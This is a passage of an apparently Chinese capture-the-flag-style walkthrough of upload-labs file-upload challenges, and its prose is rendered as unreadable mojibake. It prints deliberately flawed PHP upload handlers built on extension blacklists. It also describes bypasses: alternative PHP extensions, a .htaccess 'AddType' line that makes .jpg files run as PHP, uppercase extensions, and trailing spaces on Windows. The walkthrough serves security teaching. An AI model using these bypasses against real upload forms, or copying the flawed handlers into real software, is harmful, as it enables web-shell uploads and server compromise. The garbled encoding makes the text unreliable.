é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//æ”¶å°¾å»ç©º</span><br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                 <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœåŠ¡å™¨ç«¯åšäº†ä¸€ä¸ªé»‘åå•è¿‡æ»¤ï¼Œè¿‡æ»¤äº† <code>asp</code>ã€<code>aspx</code>ã€<code>php</code>ã€<code>jsp</code></p><p>ç»•è¿‡æ–¹æ³•</p><p>ä¸å…è®¸ä¸Šä¼ <code>.asp</code>,<code>.aspx</code>,<code>.php</code>,<code>.jsp</code>åç¼€æ–‡ä»¶ï¼Œä½†æ˜¯å¯ä»¥ä¸Šä¼ å…¶ä»–ä»»æ„åç¼€ã€‚æ¯”å¦‚è¯´:<code>.phtml .phps .php5 .pht</code>ï¼Œä½†å¦‚æœä¸Šä¼ çš„æ˜¯<code>.php5</code>è¿™ç§ç±»å‹æ–‡ä»¶çš„è¯ï¼Œå¦‚æœæƒ³è¦è¢«å½“æˆ<code>php</code>æ‰§è¡Œçš„è¯ï¼Œéœ€è¦æœ‰ä¸ªå‰ææ¡ä»¶ï¼Œå³<code>Apacheçš„httpd.confæœ‰å¦‚ä¸‹é…ç½®ä»£ç </code>ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">AddType application/x-httpd-php .php .phtml .phps .php5 .pht<br></code></pre></td></tr></table></figure><p>å…³äº<code>AddType</code>å‘½ä»¤çš„ä½œç”¨è§£é‡Šå¦‚ä¸‹</p><blockquote><p><code>AddType</code> æŒ‡ä»¤<br> ä½œç”¨ï¼šåœ¨ç»™å®šçš„æ–‡ä»¶æ‰©å±•åä¸ç‰¹å®šçš„å†…å®¹ç±»å‹ä¹‹é—´å»ºç«‹æ˜ å°„<br> è¯­æ³•ï¼š<code>AddType MIME-type extension [extension] ...</code><br><code> AddType</code>æŒ‡ä»¤åœ¨ç»™å®šçš„æ–‡ä»¶æ‰©å±•åä¸ç‰¹å®šçš„å†…å®¹ç±»å‹ä¹‹é—´å»ºç«‹æ˜ å°„å…³ç³»ã€‚MIME-typeæŒ‡æ˜äº†åŒ…å«extensionæ‰©å±•åçš„æ–‡ä»¶çš„åª’ä½“ç±»å‹ã€‚<br> <code>AddType</code> æ˜¯ä¸ç±»å‹è¡¨ç›¸å…³çš„ï¼Œæè¿°çš„æ˜¯æ‰©å±•åä¸æ–‡ä»¶ç±»å‹ä¹‹é—´çš„å…³ç³»ã€‚</p></blockquote><h1 id="htaccess-æ ¡éªŒ"><a href="#htaccess-æ ¡éªŒ" class="headerlink" title=".htaccess æ ¡éªŒ"></a>.htaccess æ ¡éªŒ</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//æ”¶å°¾å»ç©º</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»•è¿‡æ–¹æ³•</p><p>æ²¡æœ‰è¿‡æ»¤<code>.htaccess</code>åç¼€ï¼Œæ•…æ­¤å¤„ä¹Ÿå¯ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶è¿›è¡Œç»•è¿‡ã€‚<br>æ³¨: <code>.htaccess</code>æ–‡ä»¶ç”Ÿæ•ˆå‰ææ¡ä»¶ä¸º</p><p>1.mod_rewriteæ¨¡å—å¼€å¯ã€‚</p><p>2.AllowOverride All</p><blockquote><p><code>.htaccess</code>æ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡<code>htaccess</code>æ–‡ä»¶ï¼Œå¯ä»¥å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½IISå¹³å°ä¸Šä¸å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶é»˜è®¤å¼€å¯ï¼Œå¯ç”¨å’Œå…³é—­åœ¨<code>httpd.conf</code>æ–‡ä»¶ä¸­é…ç½®ã€‚</p></blockquote><p>æ„é€ <code>.htaccess</code>æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹:<code>AddType application/x-httpd-php .jpg</code><br> è¿™é‡Œä»£ç çš„æ„æ€å¯ä»¥è®© <code>.jpg</code>åç¼€åæ–‡ä»¶æ ¼å¼çš„æ–‡ä»¶åä»¥<code>php</code>æ ¼å¼è§£æï¼Œå› æ­¤è¾¾åˆ°äº†å¯æ‰§è¡Œçš„æ•ˆæœã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠè¦ä¸Šä¼ çš„<code>php</code>æ–‡ä»¶çš„åç¼€åæ”¹ä¸º<code>.jpg</code>æ ¼å¼ä»è€Œç»•è¿‡</p><h1 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»•è¿‡æ–¹æ³•</p><p>é»‘åå•å¤šäº† <code>.htaccess</code>ï¼Œæ‰€æœ‰ä¸èƒ½é€šè¿‡ <code>.htaccsess</code> è¿›è¡Œç»•è¿‡äº†ã€‚ä½†æ­¤å¤„ä»£ç æ²¡æœ‰å°†æ–‡ä»¶åç»Ÿä¸€è½¬æˆå°å†™ï¼Œæ•…å¯ä»¥é€šè¿‡å¤§å°å†™ç»•è¿‡ï¼Œç”¨burpå°†åç¼€æ”¹ä¸ºå¤§å†™PHPå³å¯ã€‚</p><h1 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°†æ–‡ä»¶åç¼€åç»Ÿä¸€è¿›è¡Œäº†å°å†™è½¬æ¢ï¼Œä½†æ˜¯æ²¡æœ‰å»é™¤æ–‡ä»¶åé¦–å°¾çš„ç©ºæ ¼ã€‚æ‰€ä»¥æ­¤å¤„å¯ä»¥åˆ©ç”¨windowsç³»ç»Ÿçš„å‘½åè§„åˆ™è¿›è¡Œç»•è¿‡ã€‚</p><blockquote><p>Winä¸‹xx.jpg[ç©ºæ ¼] æˆ–xx.jpg.è¿™ä¸¤ç±»æ–‡ä»¶éƒ½æ˜¯ä¸å…è®¸å­˜åœ¨çš„ï¼Œè‹¥è¿™æ ·å‘½åï¼Œwindowsä¼šé»˜è®¤é™¤å»ç©ºæ ¼æˆ–ç‚¹<br>æ­¤å¤„ä¼šåˆ 